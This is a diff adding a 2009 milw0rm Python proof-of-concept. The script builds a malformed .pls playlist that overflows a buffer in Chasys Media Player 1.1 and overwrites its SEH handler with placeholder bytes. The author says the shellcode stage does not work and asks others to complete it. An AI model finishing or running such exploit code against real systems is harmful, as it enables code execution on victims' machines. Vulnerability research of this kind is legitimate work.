@@ -1,0 +1,20 @@
+#!/usr/bin/python
+# Chasys Media Player 1.1 (.pls) Local Buffer Overflow (SEH) PoC
+# SEH And NEXT_SEH are Overwritten but shellcode doesn't executed !!!
+# I have tried a lot of Addresses .
+# Waitting for the Exploit from someone .
+# Download : http://www.jpcha2.com/setup/chasys_media_player.zip
+print "  Chasys Media Player 1.1 (.pls) Local Buffer Overflow (SEH) PoC"
+print "  Discovered By : zAx"
+print "  Contact : ThE-zAx@Hotmail.Com"
+header = "\x5B\x70\x6C\x61\x79\x6C\x69\x73\x74\x5D\x0A\x4E\x75\x6D\x62\x65\x72\x4F\x66\x45\x6E\x74\x72\x69\x65\x73\x3D\x31\x0A\x46\x69\x6C\x65\x31\x3D"
+junk = "\x41"*2024
+next_seh = "\x42"*4
+seh = "\x43"*4
+other_data = "\xCC"*800
+ex = header + junk + next_seh + seh + other_data
+file=open("zAx.pls","w")
+file.write(ex)
+file.close()
+
+# milw0rm.com [2009-03-18]
